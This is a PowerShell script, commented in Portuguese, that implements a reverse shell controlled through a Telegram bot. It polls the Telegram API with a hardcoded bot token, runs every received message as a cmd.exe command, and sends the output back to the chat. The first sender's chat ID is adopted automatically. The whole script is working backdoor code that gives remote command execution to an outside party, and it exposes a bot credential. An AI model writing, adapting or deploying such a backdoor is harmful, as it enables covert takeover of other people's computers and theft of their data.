$token = "7812775259:AAH75Nvnlv-XxV7g2XKcmILlXx3HWDyziOY"
$url = "https://api.telegram.org/bot$token"
$offset = 0
$chatID = $null  # Variável para armazenar o Chat ID automaticamente

function Send-Message {
    param ([string]$text)
    if ($chatID -ne $null) {
        Invoke-RestMethod -Uri "$url/sendMessage" -Method Post -Body @{
            chat_id = $chatID
            text = $text
        }
    }
}

Send-Message ":robot: Bot de Reverse Shell iniciado! Envie um comando para começar."

while ($true) {
    try {
        # Obtém novas mensagens do Telegram
        $updates = Invoke-RestMethod -Uri "$url/getUpdates?offset=$offset" -Method Get

        foreach ($update in $updates.result) {
            $update_id = $update.update_id
            $message = $update.message.text

            # Se ainda não capturamos o Chat ID, pegamos da primeira mensagem recebida
            if ($chatID -eq $null) {
                $chatID = $update.message.chat.id
                Send-Message ":white_check_mark: Chat ID detectado automaticamente!"
            }

            if ($update_id -ge $offset) {
                $offset = $update_id + 1  # Atualiza o offset para evitar repetição

                # Executa o comando no cmd e captura a saída
                $output = cmd.exe /c $message 2>&1
                
                # Converte a saída em string legível
                if ($output -is [System.Array]) {
                    $output = $output -join "`n"
                }

                # Envia a saída do comando de volta ao Telegram
                Send-Message $output
            }
        }
    } catch {
        Write-Host "Erro: $_"
    }
    Start-Sleep -Seconds 3  # Evita sobrecarga de requisições
}
